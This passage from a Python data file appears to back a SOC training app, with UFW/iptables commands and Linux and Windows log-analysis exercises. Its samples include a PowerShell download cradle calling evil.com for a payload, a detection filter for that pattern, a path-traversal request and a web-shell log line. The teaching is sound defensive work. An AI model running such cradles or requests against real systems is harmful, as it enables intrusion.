     "cmd": "sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP",
     "desc": "Rate-limit SSH — block > 4 new connections per minute",
     "scenario": "Manual rate limiting — same effect as UFW's 'limit ssh'.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "User", "to": "SSH:22", "data": "Connection 1", "title": "Track IP", "desc": "IP added to 'recent' list", "color": "#27ae60"},
         {"from": "User", "to": "SSH:22", "data": "Connection 4", "title": "Threshold hit", "desc": "4th connection in 60s window", "color": "#e74c3c"},
         {"from": "Firewall", "to": "User", "data": "DROP", "title": "Blocked", "desc": "Further attempts dropped for 60s", "color": "#c0392b"}
     ]},
    {"id": "ipt_7", "category": "Advanced", "color": "#9b59b6",
     "cmd": "sudo iptables -A INPUT -j LOG --log-prefix 'IPT-DROP: '",
     "desc": "Log dropped packets with a custom prefix",
     "scenario": "Place this rule BEFORE the DROP rules. Logs to /var/log/kern.log — great for SIEM.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "Any packet", "to": "Firewall", "data": "No prior match", "title": "Reaches LOG rule", "desc": "Unmatched packets arrive here", "color": "#3498db"},
         {"from": "Firewall", "to": "/var/log/kern.log", "data": "IPT-DROP: ...", "title": "Written to log", "desc": "Prefix makes grepping easy", "color": "#f39c12"}
     ]},
    {"id": "ipt_8", "category": "Advanced", "color": "#c0392b",
     "cmd": "sudo iptables -F",
     "desc": "Flush ALL rules — DANGEROUS on remote servers",
     "scenario": "⚠️ Removes every rule. If you're SSH'd in, you're now fully exposed.",
     "output": "(no output — success is silent)",
     "simulation": [
         {"from": "iptables", "to": "Kernel", "data": "Flush INPUT", "title": "Clear INPUT", "desc": "All INPUT rules removed", "color": "#e74c3c"},
         {"from": "Server", "to": "Internet", "data": "Exposed", "title": "⚠️ No filtering", "desc": "Only chain policies remain", "color": "#f39c12"}
     ]},
    {"id": "ipt_9", "category": "Persistence", "color": "#16a085",
     "cmd": "sudo netfilter-persistent save",
     "desc": "Save iptables rules across reboots (Debian/Ubuntu)",
     "scenario": "iptables rules are lost on reboot. Run this after setting rules.",
     "output": "run-parts: executing /usr/share/netfilter-persistent/plugins.d/15-ip4tables save",
     "simulation": [
         {"from": "iptables", "to": "iptables-save", "data": "Dump current rules", "title": "Dump rules", "desc": "All active rules serialized", "color": "#3498db"},
         {"from": "netfilter-persistent", "to": "/etc/iptables/rules.v4", "data": "Write file", "title": "Save to disk", "desc": "Rules saved in text format", "color": "#f39c12"},
         {"from": "systemd", "to": "netfilter-persistent", "data": "On next boot", "title": "Reload at boot", "desc": "Service restores rules automatically", "color": "#27ae60"}
     ]},
]

UFW_SCENARIOS = [
    {"id": "sc_1", "title": "SSH Brute Force Attack", "icon": "🔨", "color": "#e74c3c",
     "situation": "Someone is hammering your SSH port with thousands of password attempts from a single IP.",
     "detection_cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
     "detection_output": "  642 203.0.113.5\n   58 198.51.100.42\n   23 192.0.2.77",
     "analysis": "642 failed logins from one IP in the last hour = automated brute force.",
     "response_cmds": ["sudo ufw deny from 203.0.113.5", "sudo ufw limit ssh", "sudo ufw status | grep 203.0.113.5"],
     "post_action": "Attacker's next connection times out.",
     "simulation": [
         {"from": "Attacker 203.0.113.5", "to": "SSH:22", "data": "Trying passwords...", "title": "Attack starts", "desc": "Automated tool hits SSH from one IP", "color": "#e74c3c"},
         {"from": "sshd", "to": "auth.log", "data": "Failed password", "title": "Failures logged", "desc": "Every attempt written to log", "color": "#f39c12"},
         {"from": "Admin", "to": "ufw", "data": "ufw deny 203.0.113.5", "title": "Block IP", "desc": "Firewall rule added instantly", "color": "#27ae60"}
     ]},
    {"id": "sc_2", "title": "Port Scan Detected", "icon": "🔍", "color": "#f39c12",
     "situation": "A scanner is probing every port on your server to find exposed services.",
     "detection_cmd": "sudo grep 'UFW BLOCK' /var/log/ufw.log | awk '{print $13}' | sort | uniq -c | sort -rn | head",
     "detection_output": " 4521 203.0.113.5\n  234 198.51.100.42",
     "analysis": "One IP triggered 4,521 BLOCK entries — clearly a port scanner.",
     "response_cmds": ["sudo ufw deny from 203.0.113.5", "sudo ufw logging on", "sudo tail -f /var/log/ufw.log"],
     "post_action": "Scanner's IP is dropped.",
     "simulation": [
         {"from": "Scanner", "to": "Your server", "data": "Scan ports 1-65535", "title": "Scan starts", "desc": "Attacker probes ports", "color": "#f39c12"},
         {"from": "Firewall", "to": "/var/log/ufw.log", "data": "UFW BLOCK × 4521", "title": "Firewall logs", "desc": "Every blocked port is logged", "color": "#e74c3c"},
         {"from": "Admin", "to": "ufw", "data": "ufw deny from scanner", "title": "Block", "desc": "Scanner IP dropped", "color": "#27ae60"}
     ]},
    {"id": "sc_3", "title": "Database Port Accidentally Exposed", "icon": "🗄️", "color": "#c0392b",
     "situation": "Someone ran 'ufw allow 3306' on a public server and now MySQL is reachable from the internet.",
     "detection_cmd": "sudo ufw status | grep 3306",
     "detection_output": "3306/tcp                   ALLOW       Anywhere\n3306/tcp (v6)              ALLOW       Anywhere (v6)",
     "analysis": "MySQL is exposed to the entire internet.",
     "response_cmds": ["sudo ufw delete allow 3306/tcp", "sudo ufw allow from 10.0.0.0/8 to any port 3306"],
     "post_action": "MySQL is now only reachable from the internal network.",
     "simulation": [
         {"from": "Admin", "to": "ufw", "data": "ufw allow 3306/tcp", "title": "Mistake made", "desc": "MySQL opened from anywhere", "color": "#e74c3c"},
         {"from": "Shodan", "to": "Your server:3306", "data": "Port scan", "title": "Indexed", "desc": "Public scans find the port", "color": "#f39c12"},
         {"from": "Admin", "to": "ufw", "data": "ufw delete allow 3306", "title": "Fixed", "desc": "Rule removed", "color": "#27ae60"}
     ]},
    {"id": "sc_4", "title": "Locked Out After Enabling UFW", "icon": "🔒", "color": "#e74c3c",
     "situation": "You ran 'ufw enable' without allowing SSH first. Your remote session times out.",
     "detection_cmd": "ssh: connect to host 192.168.1.10 port 22: Connection timed out",
     "detection_output": "ssh: connect to host 192.168.1.10 port 22: Connection timed out",
     "analysis": "The firewall is dropping your own inbound SSH packets.",
     "response_cmds": ["sudo ufw disable", "sudo ufw allow ssh", "sudo ufw enable"],
     "post_action": "Correct order: allow SSH first, then enable.",
     "simulation": [
         {"from": "Admin", "to": "ufw", "data": "ufw enable", "title": "Enable", "desc": "Firewall turns on without SSH rule", "color": "#f39c12"},
         {"from": "Firewall", "to": "Admin", "data": "DROP SSH", "title": "Locked out", "desc": "Your SSH packets are dropped", "color": "#e74c3c"},
         {"from": "Admin", "to": "ufw", "data": "ufw allow ssh", "title": "Add rule", "desc": "SSH allowed", "color": "#27ae60"}
     ]},
]


MODULES["ufw"] = {
    "key": "ufw",
    "title": "UFW Firewall",
    "icon": "🔥",
    "template": "ufw.html",
    "intro": {
        "what": "UFW (Uncomplicated Firewall) is Ubuntu's user-friendly frontend for iptables. It lets you allow, deny, limit, and delete firewall rules without writing complex iptables syntax.",
        "why_soc": [
            "Block attackers instantly — one command drops all traffic from a malicious IP",
            "Control which ports are exposed — reduce attack surface on servers",
            "Rate-limit SSH brute force — auto-block IPs trying too many connections",
            "Log every blocked packet — useful for forensic analysis",
            "Simple enough to use under pressure during an incident"
        ]
    },
    "commands": UFW_COMMANDS,
    "scenarios": UFW_SCENARIOS,
    "extra": {
        "iptables_intro": {
            "what": "iptables is the actual Linux kernel firewall. UFW is a friendly wrapper around it.",
            "why_soc": [
                "See the raw rule list — understand exactly what's enforced",
                "Debug UFW issues by inspecting underlying iptables rules",
                "Build custom chains for complex filtering logic",
                "Log packets with custom prefixes for SIEM ingestion"
            ]
        },
        "iptables_tables": [
            {"name": "filter", "desc": "Default table — decides whether to allow a packet",
             "chains": ["INPUT", "OUTPUT", "FORWARD"], "use": "Standard firewall rules"},
            {"name": "nat", "desc": "Network Address Translation",
             "chains": ["PREROUTING", "OUTPUT", "POSTROUTING"], "use": "Port forwarding, SNAT, DNAT"},
            {"name": "mangle", "desc": "Modifies packet headers",
             "chains": ["PREROUTING", "OUTPUT", "INPUT", "FORWARD", "POSTROUTING"], "use": "QoS, advanced routing"},
            {"name": "raw", "desc": "Handles packets before connection tracking",
             "chains": ["PREROUTING", "OUTPUT"], "use": "NOTRACK for high-throughput services"}
        ],
        "iptables_commands": IPTABLES_COMMANDS,
    }
}


# ==================== MODULE: LOGS BASICS ====================
MODULES["logs"] = {
    "key": "logs",
    "title": "Logs Basics",
    "icon": "📜",
    "template": "logs.html",
    "intro": {
        "what": (
            "A log is a timestamped record of an event — what happened, when, and who or what caused it. "
            "Logs are the primary source of truth for any security analyst. Every login, every service restart, "
            "every network connection, every config change writes a line somewhere. Learning to read logs is the "
            "single most important SOC skill."
        ),
        "why_soc": [
            "Detection — attacks leave traces in logs before they cause damage",
            "Investigation — after an incident, logs reconstruct the timeline",
            "Compliance — PCI-DSS, HIPAA, SOC2 require 90+ days of log retention",
            "Alerting — a SIEM like Splunk ingests logs and fires alerts on patterns",
            "Forensics — binary logs (wtmp, btmp) prove who logged in and from where",
            "Baseline — knowing what 'normal' looks like makes anomalies obvious"
        ]
    },
    "commands": [
        # ============ LINUX — AUTHENTICATION ============
        {
            "id": "log_1",
            "category": "Linux — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo tail -f /var/log/auth.log",
            "desc": "Follow the authentication log in real time (Debian/Ubuntu)",
            "scenario": (
                "You're watching for a suspected SSH brute force. tail -f shows new lines the moment sshd writes them. "
                "Every failed password, every sudo command, every su switch shows up here."
            ),
            "output": (
                "Jan 15 14:23:45 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2\n"
                "Jan 15 14:23:47 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51236 ssh2\n"
                "Jan 15 14:24:01 server sshd[1235]: Accepted password for alice from 192.168.1.50 port 45678 ssh2\n"
                "Jan 15 14:24:15 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow"
            ),
            "simulation": [
                {"from": "sshd", "to": "auth.log", "data": "Failed password", "title": "Auth failure", "desc": "Invalid login is written to the log", "color": "#e74c3c"},
                {"from": "Admin", "to": "auth.log", "data": "tail -f", "title": "Watch live", "desc": "New lines appear as they're written", "color": "#3498db"},
                {"from": "Admin", "to": "Firewall", "data": "ufw deny from IP", "title": "Respond", "desc": "Block the attacker after detection", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_2",
            "category": "Linux — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo cat /var/log/auth.log | grep 'Failed password' | wc -l",
            "desc": "Count failed password attempts — spot brute force at a glance",
            "scenario": (
                "You suspect an attack but want a number. Cat reads the whole file, grep filters to failures, "
                "wc -l counts them. A count in the hundreds or thousands = active brute force."
            ),
            "output": "847",
            "simulation": [
                {"from": "cat", "to": "auth.log", "data": "Read all lines", "title": "Load file", "desc": "Every line read from disk", "color": "#3498db"},
                {"from": "grep", "to": "Stream", "data": "Failed password", "title": "Filter", "desc": "Only matching lines kept", "color": "#f39c12"},
                {"from": "wc -l", "to": "Terminal", "data": "847", "title": "Count", "desc": "Total failures printed", "color": "#e74c3c"}
            ]
        },
        {
            "id": "log_3",
            "category": "Linux — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo lastb | head -20",
            "desc": "Show the last 20 failed logins from the btmp binary log",
            "scenario": (
                "btmp is a binary log of every failed login. It survives syslog rotation and is harder for attackers "
                "to tamper with. 'lastb' is the only way to read it."
            ),
            "output": (
                "admin    ssh:notty    203.0.113.5      Mon Jan 15 14:23 - 14:23  (00:00)\n"
                "root     ssh:notty    203.0.113.5      Mon Jan 15 14:22 - 14:22  (00:00)\n"
                "test     ssh:notty    198.51.100.42    Mon Jan 15 14:15 - 14:15  (00:00)"
            ),
            "simulation": [
                {"from": "lastb", "to": "/var/log/btmp", "data": "Read binary", "title": "Decode btmp", "desc": "Binary log decoded to text", "color": "#f39c12"},
                {"from": "head", "to": "Terminal", "data": "First 20", "title": "Trim output", "desc": "Only the last 20 shown", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_4",
            "category": "Linux — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo last | head -20",
            "desc": "Show the last 20 successful logins from wtmp",
            "scenario": (
                "wtmp records every login and logout with timestamps and source IP. If you see a login "
                "from an unusual IP at 3 AM, it's evidence for the incident report."
            ),
            "output": (
                "alice    pts/0        192.168.1.50     Mon Jan 15 14:24   still logged in\n"
                "alice    pts/0        192.168.1.50     Mon Jan 15 09:12 - 12:34  (03:22)\n"
                "bob      pts/1        10.0.0.42        Sun Jan 14 22:15 - 23:01  (00:46)"
            ),
            "simulation": [
                {"from": "last", "to": "/var/log/wtmp", "data": "Read binary", "title": "Decode wtmp", "desc": "Login history read from binary log", "color": "#f39c12"},
                {"from": "Terminal", "to": "Analyst", "data": "3 AM login", "title": "Spot anomaly", "desc": "Unusual time or IP stands out", "color": "#e74c3c"}
            ]
        },

        # ============ LINUX — SYSTEM ============
        {
            "id": "log_5",
            "category": "Linux — System",
            "color": "#3498db",
            "cmd": "sudo tail -n 100 /var/log/syslog",
            "desc": "Show the last 100 lines of the general system log",
            "scenario": (
                "Something restarted unexpectedly. syslog shows every service start/stop event, kernel message, "
                "cron job, and hardware change with exact timestamps."
            ),
            "output": (
                "Jan 15 14:23:45 server systemd[1]: Starting Daily apt upgrade...\n"
                "Jan 15 14:23:47 server kernel: [12345.678] usb 1-1: new high-speed USB device\n"
                "Jan 15 14:23:52 server NetworkManager[890]: <info> device (eth0): activated\n"
                "Jan 15 14:24:01 server cron[1234]: (root) CMD (run-parts /etc/cron.daily)"
            ),
            "simulation": [
                {"from": "systemd", "to": "syslog", "data": "Service started", "title": "Service event", "desc": "Every service change is logged", "color": "#3498db"},
                {"from": "kernel", "to": "syslog", "data": "USB device", "title": "Kernel event", "desc": "Hardware changes are logged", "color": "#9b59b6"},
                {"from": "cron", "to": "syslog", "data": "CMD run-parts", "title": "Scheduled job", "desc": "Every cron run is logged", "color": "#f39c12"}
            ]
        },
        {
            "id": "log_6",
            "category": "Linux — System",
            "color": "#3498db",
            "cmd": "sudo journalctl -u ssh --since '1 hour ago'",
            "desc": "Query systemd journal for SSH events in the last hour",
            "scenario": (
                "journalctl queries the binary systemd journal. You can filter by service (-u), time (--since), "
                "priority (-p err), and even regex on the message. Much faster than grep on flat files."
            ),
            "output": (
                "Jan 15 14:28:12 host sshd[890]: Accepted password for alice from 192.168.1.50 port 51234 ssh2\n"
                "Jan 15 14:28:12 host sshd[890]: pam_unix(sshd:session): session opened for user alice\n"
                "Jan 15 14:30:45 host sshd[890]: pam_unix(sshd:session): session closed for user alice"
            ),
            "simulation": [
                {"from": "journalctl", "to": "journald", "data": "Filter _SYSTEMD_UNIT=ssh", "title": "Query journal", "desc": "Only ssh.service entries returned", "color": "#3498db"},
                {"from": "journald", "to": "Index", "data": "1 hour window", "title": "Time filter", "desc": "--since limits to the last hour", "color": "#f39c12"},
                {"from": "journalctl", "to": "Terminal", "data": "Formatted lines", "title": "Display", "desc": "Human-readable output", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_7",
            "category": "Linux — System",
            "color": "#3498db",
            "cmd": "dmesg -T | tail -30",
            "desc": "Show the last 30 kernel messages with human-readable timestamps",
            "scenario": (
                "The kernel ring buffer holds hardware, driver, and firewall (iptables LOG) messages. "
                "dmesg -T converts the boot-relative timestamps into real clock time."
            ),
            "output": (
                "[Mon Jan 15 14:20:00 2024] usb 1-1: new high-speed USB device number 5 using xhci_hcd\n"
                "[Mon Jan 15 14:20:05 2024] iptables: IN=eth0 SRC=203.0.113.5 DST=192.168.1.10 DPT=22 DROP\n"
                "[Mon Jan 15 14:21:12 2024] Out of memory: Killed process 1234 (mysqld)"
            ),
            "simulation": [
                {"from": "dmesg", "to": "Kernel ring buffer", "data": "Read messages", "title": "Read buffer", "desc": "Kernel keeps last N messages in RAM", "color": "#3498db"},
                {"from": "-T", "to": "Timestamps", "data": "Boot → clock", "title": "Human time", "desc": "Converts seconds-since-boot to real clock", "color": "#f39c12"},
                {"from": "tail", "to": "Terminal", "data": "Last 30", "title": "Trim", "desc": "Only last 30 shown", "color": "#27ae60"}
            ]
        },

        # ============ LINUX — SECURITY ============
        {
            "id": "log_8",
            "category": "Linux — Security",
            "color": "#f39c12",
            "cmd": "sudo tail -f /var/log/ufw.log",
            "desc": "Follow firewall blocks live",
            "scenario": (
                "Every packet UFW blocks (or allows, if configured) writes a line here. Running 'tail -f' during "
                "an attack shows lines scrolling like a movie — the fastest way to see what's being hit."
            ),
            "output": (
                "Jan 15 14:23:45 server kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.5 DST=192.168.1.10 DPT=22 SYN\n"
                "Jan 15 14:23:47 server kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.42 DST=192.168.1.10 DPT=3306 SYN"
            ),
            "simulation": [
                {"from": "netfilter", "to": "ufw.log", "data": "UFW BLOCK entry", "title": "Packet blocked", "desc": "Each dropped packet written to log", "color": "#e74c3c"},
                {"from": "Admin", "to": "ufw.log", "data": "tail -f", "title": "Live view", "desc": "Lines appear as attack happens", "color": "#3498db"},
                {"from": "Admin", "to": "Firewall", "data": "ufw deny attacker", "title": "Respond", "desc": "Block the source IP", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_9",
            "category": "Linux — Security",
            "color": "#f39c12",
            "cmd": "sudo tail -f /var/log/fail2ban.log",
            "desc": "Follow fail2ban bans and unbans",
            "scenario": (
                "fail2ban watches auth.log for repeated failures and bans the source IP via UFW. This log shows "
                "exactly what it banned, when, and for how long."
            ),
            "output": (
                "2024-01-15 14:24:00,123 fail2ban.actions [1234]: NOTICE [sshd] Ban 203.0.113.5\n"
                "2024-01-15 14:34:00,456 fail2ban.actions [1234]: NOTICE [sshd] Unban 203.0.113.5"
            ),
            "simulation": [
                {"from": "fail2ban", "to": "auth.log", "data": "5 failures from IP", "title": "Detect pattern", "desc": "Watches auth.log in real time", "color": "#f39c12"},
                {"from": "fail2ban", "to": "ufw", "data": "ufw deny from IP", "title": "Trigger ban", "desc": "Adds a temporary firewall rule", "color": "#e74c3c"},
                {"from": "fail2ban", "to": "fail2ban.log", "data": "Ban logged", "title": "Record", "desc": "Ban + expiry written to log", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_10",
            "category": "Linux — Security",
            "color": "#c0392b",
            "cmd": "sudo ausearch -k passwd_changes -i",
            "desc": "Search the audit log for /etc/passwd changes",
            "scenario": (
                "auditd watches /etc/passwd with a named key. If someone adds an unauthorised user, "
                "ausearch shows the exact command, user, and timestamp — kernel-level evidence."
            ),
            "output": (
                "type=SYSCALL msg=audit(1705329312.456:1234): arch=c000003e syscall=257 success=yes\n"
                "  ppid=1234 pid=5678 auid=0 uid=0 gid=0 comm=\"usermod\" exe=\"/usr/sbin/usermod\"\n"
                "  key=\"passwd_changes\""
            ),
            "simulation": [
                {"from": "usermod", "to": "Kernel", "data": "open(/etc/passwd, W)", "title": "Syscall", "desc": "User modifies the file", "color": "#f39c12"},
                {"from": "Kernel", "to": "audit.log", "data": "Audit event", "title": "Captured", "desc": "Kernel hook fires", "color": "#9b59b6"},
                {"from": "ausearch", "to": "Admin", "data": "Full context", "title": "Query", "desc": "Who, what, when revealed", "color": "#27ae60"}
            ]
        },

        # ============ LINUX — WEB / DB ============
        {
            "id": "log_11",
            "category": "Linux — Web / DB",
            "color": "#16a085",
            "cmd": "sudo tail -f /var/log/apache2/access.log",
            "desc": "Follow every HTTP request to Apache",
            "scenario": (
                "Each line is one HTTP request: source IP, timestamp, method, URL, status, size, user-agent. "
                "Attackers using sqlmap, Nikto, or manual SQLi all show up here with their User-Agent."
            ),
            "output": (
                "203.0.113.5 - - [15/Jan/2024:14:23:47] \"GET /admin.php HTTP/1.1\" 404 512 \"-\" \"sqlmap/1.7.2\"\n"
                "203.0.113.5 - - [15/Jan/2024:14:23:48] \"GET /../../etc/passwd HTTP/1.1\" 400 226 \"-\" \"sqlmap/1.7.2\""
            ),
            "simulation": [
                {"from": "Browser", "to": "Apache", "data": "GET /", "title": "Request arrives", "desc": "Every HTTP request is logged", "color": "#3498db"},
                {"from": "Apache", "to": "access.log", "data": "200 OK, 512 bytes", "title": "Log written", "desc": "IP, method, URL, status, size, UA", "color": "#f39c12"},
                {"from": "Attacker", "to": "Apache", "data": "GET /admin.php", "title": "Attack scan", "desc": "sqlmap User-Agent reveals the tool", "color": "#e74c3c"}
            ]
        },
        {
            "id": "log_12",
            "category": "Linux — Web / DB",
            "color": "#16a085",
            "cmd": "sudo grep -E 'Failed|error|denied' /var/log/apache2/error.log | tail -30",
            "desc": "Show recent Apache errors",
            "scenario": (
                "Apache errors reveal file permission issues, PHP crashes, and attempted exploits. A sudden flood "
                "of PHP errors usually means someone is fuzzing your app."
            ),
            "output": (
                "[Mon Jan 15 14:24:01] [php:error] PHP Fatal error: Uncaught Error: Call to undefined function shell_exec() in /uploads/shell.php:3\n"
                "[Mon Jan 15 14:24:03] [authz_core:error] client denied by server configuration: /admin"
            ),
            "simulation": [
                {"from": "Attacker", "to": "Apache", "data": "POST /uploads/shell.php", "title": "Web shell used", "desc": "Malicious PHP triggered", "color": "#e74c3c"},
                {"from": "PHP", "to": "error.log", "data": "Fatal error", "title": "Error logged", "desc": "Crashed script reveals attack", "color": "#f39c12"},
                {"from": "Admin", "to": "error.log", "data": "grep Failed|error", "title": "Investigate", "desc": "Filter to interesting lines", "color": "#27ae60"}
            ]
        },

        # ============ WINDOWS — EVENT VIEWER ============
        {
            "id": "log_13",
            "category": "Windows — Event Viewer",
            "color": "#3498db",
            "cmd": "eventvwr.msc",
            "desc": "Open Windows Event Viewer GUI",
            "scenario": (
                "Event Viewer is the built-in GUI. Left pane shows log channels (System, Application, Security). "
                "Middle pane lists events. Right pane has 'Filter Current Log' to search by Event ID or time."
            ),
            "output": (
                "Event Viewer opens.\n"
                "Navigate: Windows Logs → Security → Filter Current Log → Event IDs: 4625 → OK\n"
                "Burst of 4625 events from one IP = brute force."
            ),
            "simulation": [
                {"from": "Analyst", "to": "eventvwr.msc", "data": "Launch", "title": "Open GUI", "desc": "Event Viewer window appears", "color": "#3498db"},
                {"from": "GUI", "to": "Security channel", "data": "Filter 4625", "title": "Filter events", "desc": "Right-click → Filter Current Log", "color": "#f39c12"},
                {"from": "Channel", "to": "Analyst", "data": "List of failures", "title": "Review", "desc": "Spot IP bursts = brute force", "color": "#e74c3c"}
            ]
        },
        {
            "id": "log_14",
            "category": "Windows — Event Viewer",
            "color": "#3498db",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 20",
            "desc": "Query failed logons via PowerShell",
            "scenario": (
                "The PowerShell equivalent of Event Viewer filtering. Faster, scriptable, and pipe-friendly. "
                "Pipe to Group-Object to count failures by source IP."
            ),
            "output": (
                "TimeCreated          Id Message\n"
                "-----------          -- -------\n"
                "1/15/2024 2:23 PM  4625 An account failed to log on. (admin / 203.0.113.5)\n"
                "1/15/2024 2:23 PM  4625 An account failed to log on. (admin / 203.0.113.5)"
            ),
            "simulation": [
                {"from": "PowerShell", "to": "Security channel", "data": "Filter ID=4625", "title": "Query events", "desc": "FilterHashtable limits the query", "color": "#3498db"},
                {"from": "Channel", "to": "PowerShell", "data": "20 events", "title": "Return", "desc": "MaxEvents caps the count", "color": "#f39c12"},
                {"from": "PowerShell", "to": "Terminal", "data": "Formatted list", "title": "Display", "desc": "Time, ID, Message shown", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_15",
            "category": "Windows — Event Viewer",
            "color": "#3498db",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} | Group-Object -Property {$_.Properties[5].Value} | Sort-Object Count -Descending | Select-Object -First 10",
            "desc": "Count failed logons by source IP — top 10 brute force sources",
            "scenario": (
                "Real SOC pattern: pipe 4625 events through Group-Object to count by source IP. Top result "
                "tells you which IP is doing the most damage in one line."
            ),
            "output": (
                "Count Name\n"
                "----- ----\n"
                " 4521 203.0.113.5\n"
                "  234 198.51.100.42\n"
                "   89 192.0.2.77"
            ),
            "simulation": [
                {"from": "Get-WinEvent", "to": "Security channel", "data": "All 4625 events", "title": "Pull events", "desc": "Every failed logon", "color": "#3498db"},
                {"from": "Group-Object", "to": "Stream", "data": "Group by IP", "title": "Count", "desc": "One row per source IP", "color": "#f39c12"},
                {"from": "Sort-Object", "to": "Terminal", "data": "Top 10", "title": "Rank", "desc": "Biggest attacker first", "color": "#e74c3c"}
            ]
        },
        {
            "id": "log_16",
            "category": "Windows — Event Viewer",
            "color": "#9b59b6",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=4104} | Where-Object {$_.Message -match 'EncodedCommand|FromBase64String|IEX|DownloadString'}",
            "desc": "Find malicious PowerShell activity",
            "scenario": (
                "Event 4104 captures deobfuscated PowerShell scripts. Filtering for IEX, DownloadString, and "
                "EncodedCommand surfaces the classic download cradle pattern attackers use."
            ),
            "output": (
                "TimeCreated        Message\n"
                "-----------        -------\n"
                "1/15/2024 2:25 PM  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
            ),
            "simulation": [
                {"from": "Attacker", "to": "PowerShell", "data": "IEX DownloadString", "title": "Download cradle", "desc": "Fetch + execute remote script", "color": "#e74c3c"},
                {"from": "PowerShell", "to": "Event 4104", "data": "Script block", "title": "Logged", "desc": "Deobfuscated script written to log", "color": "#f39c12"},
                {"from": "Get-WinEvent", "to": "Analyst", "data": "Matched payload", "title": "Detect", "desc": "Filter reveals the attack", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_17",
            "category": "Windows — Sysmon",
            "color": "#8e44ad",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=3} | Where-Object {$_.Message -match 'Established'} | Select-Object -First 20",
            "desc": "Sysmon: recent outbound TCP connections",
            "scenario": (
                "Sysmon Event 3 = every network connection, with the process that made it. Filtering to "
                "'Established' shows active sessions — perfect for spotting C2 beaconing."
            ),
            "output": (
                "TimeCreated        Message\n"
                "-----------        -------\n"
                "1/15/2024 2:23 PM  Process: powershell.exe DestIP: 203.0.113.5 DestPort: 443\n"
                "1/15/2024 2:24 PM  Process: rundll32.exe    DestIP: 198.51.100.42 DestPort: 8080"
            ),
            "simulation": [
                {"from": "Malware", "to": "Network", "data": "TCP to C2:443", "title": "Connection made", "desc": "Attacker calls home", "color": "#e74c3c"},
                {"from": "Sysmon", "to": "Event 3", "data": "Process + DestIP", "title": "Logged", "desc": "Every connection with attribution", "color": "#f39c12"},
                {"from": "Analyst", "to": "Event 3", "data": "Established only", "title": "Filter", "desc": "Focus on live sessions", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_18",
            "category": "Windows — Sysmon",
            "color": "#8e44ad",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=10} | Where-Object {$_.Message -match 'lsass.exe'}",
            "desc": "Sysmon: detect processes accessing LSASS (credential theft)",
            "scenario": (
                "LSASS memory holds password hashes. Any process accessing LSASS outside of known-safe tools "
                "= potential credential dumping (Mimikatz, ProcDump, comsvcs.dll)."
            ),
            "output": (
                "TimeCreated        Message\n"
                "-----------        -------\n"
                "1/15/2024 2:30 PM  SourceImage: mimikatz.exe TargetImage: lsass.exe GrantedAccess: 0x1410"
            ),
            "simulation": [
                {"from": "mimikatz", "to": "LSASS", "data": "OpenProcess", "title": "Attempt theft", "desc": "Read LSASS memory", "color": "#e74c3c"},
                {"from": "Kernel", "to": "Sysmon", "data": "Event 10", "title": "Logged", "desc": "Sysmon catches the access", "color": "#f39c12"},
                {"from": "Analyst", "to": "Alert", "data": "Credential theft!", "title": "Respond", "desc": "Isolate host immediately", "color": "#27ae60"}
            ]
        },

        # ============ WINDOWS — SYSTEM ============
        {
            "id": "log_19",
            "category": "Windows — System",
            "color": "#16a085",
            "cmd": "Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} -MaxEvents 20",
            "desc": "New services installed — persistence indicator",
            "scenario": (
                "Event 7045 fires every time a Windows service is installed. Attackers (PsExec, Cobalt Strike, "
                "ransomware loaders) install services for persistence. Anything outside a change window is suspicious."
            ),
            "output": (
                "TimeCreated        Message\n"
                "-----------        -------\n"
                "1/15/2024 2:45 PM  Service Name: WindowsUpdateService\n"
                "                   ImagePath: C:\\Users\\Public\\svchost.exe\n"
                "                   ServiceType: user mode service"
            ),
            "simulation": [
                {"from": "Attacker", "to": "Windows", "data": "sc create svc", "title": "Install service", "desc": "Malware persisted via service", "color": "#e74c3c"},
                {"from": "Windows", "to": "System log", "data": "Event 7045", "title": "Logged", "desc": "Service creation recorded", "color": "#f39c12"},
                {"from": "Analyst", "to": "Alert", "data": "Suspicious path", "title": "Investigate", "desc": "User dir + update name = IOC", "color": "#27ae60"}
            ]
        },
        {
            "id": "log_20",
            "category": "Windows — System",
            "color": "#16a085",
            "cmd": "Get-Content C:\\Windows\\System32\\winevt\\Logs\\Security.evtx -Wait -Tail 20",
            "desc": "Stream the Security event log file as live text",
            "scenario": (
                "The .evtx files in winevt\\Logs are the raw binary event logs. Get-Content -Wait streams new "
                "events live (like tail -f on Linux) — useful when you can't run Get-WinEvent for some reason."
            ),
            "output": (
                "(Binary .evtx content — normally you'd use Event Viewer or Get-WinEvent.)\n"
                "This command shows the file stream, but PowerShell will print readable event records only\n"
                "when the file has been exported to CSV/XML first. Use 'wevtutil epl Security C:\\temp\\sec.evtx'."
            ),
            "simulation": [
